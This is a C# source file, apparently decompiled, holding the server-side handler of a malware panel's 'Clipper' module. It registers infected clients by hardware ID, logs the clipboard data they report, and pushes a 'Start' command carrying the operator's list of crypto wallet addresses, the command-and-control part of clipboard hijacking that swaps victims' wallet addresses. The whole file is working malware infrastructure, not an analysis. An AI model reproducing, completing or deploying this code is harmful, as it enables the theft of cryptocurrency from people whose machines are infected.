using System.Windows.Forms;
using Server.Connectings;

namespace Server.Messages;

internal class HandlerClipper
{
	public static void Read(Clients clients, object[] array)
	{
		if (clients == null || array == null || array.Length < 2)
		{
			if (clients != null)
			{
				clients.Disconnect();
			}
			return;
		}
		string a = (string)array[1];
		if (!(a == "Connect"))
		{
			if (!(a == "Log"))
			{
				return;
			}
			if (Program.form.Clipper.work)
			{
				DataGridViewRow dataGridViewRow = new DataGridViewRow();
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = clients.Hwid
				});
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = (string)array[2]
				});
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = (string)array[3]
				});
				Program.form.Clipper.Invoke((MethodInvoker)delegate
				{
					Program.form.Clipper.GridLog.Rows.Add(dataGridViewRow);
				});
			}
			else
			{
				clients.Disconnect();
			}
			return;
		}
		if (!Program.form.Clipper.work)
		{
			clients.Disconnect();
			return;
		}
		clients.Hwid = (string)array[2];
		clients.eventDisconnect += delegate
		{
			Program.form.Clipper.Invoke((MethodInvoker)delegate
			{
				Program.form.Clipper.clients.Remove(clients);
			});
		};
		Program.form.Clipper.Invoke((MethodInvoker)delegate
		{
			Program.form.Clipper.clients.Add(clients);
		});
		if (Program.form.Clipper.materialSwitch7.Checked)
		{
			clients.Send(new object[2]
			{
				"Start",
				string.Join(",", Program.form.Clipper.CryptoWallet)
			});
		}
	}
}
